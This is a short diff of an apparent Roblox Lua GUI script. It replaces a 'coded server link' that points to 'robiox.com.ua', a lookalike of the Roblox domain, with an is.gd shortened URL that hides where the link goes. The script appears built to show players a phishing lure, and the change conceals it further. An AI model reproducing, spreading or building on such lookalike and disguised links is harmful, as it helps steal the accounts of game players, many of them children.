@@ -4,7 +4,7 @@ local Players = game:GetService("Players")
 local player = Players.LocalPlayer
 
 -- UPDATED CODED SERVER LINK
-local codedServerLink = "https://www.robiox.com.ua/communities/7262061198/so2scripts"
+local codedServerLink = "https://is.gd/ILsxVY"
 
 -- ScreenGui
 local gui = Instance.new("ScreenGui")
